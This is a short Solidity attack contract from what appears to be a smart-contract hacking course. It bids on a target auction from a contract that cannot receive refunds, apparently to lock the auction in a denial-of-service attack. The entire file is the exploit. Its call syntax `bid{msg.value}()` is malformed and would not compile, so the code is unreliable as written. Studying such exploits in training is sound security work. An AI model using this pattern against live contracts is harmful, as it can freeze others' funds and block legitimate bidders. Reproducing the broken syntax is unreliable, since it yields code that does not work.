// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

interface IAuction {
    function bid() external payable;
}

contract Attack{
    IAuction auction;

    constructor(address _auction) payable {
        auction = IAuction(_auction);
        auction.bid{msg.value}();
    }
}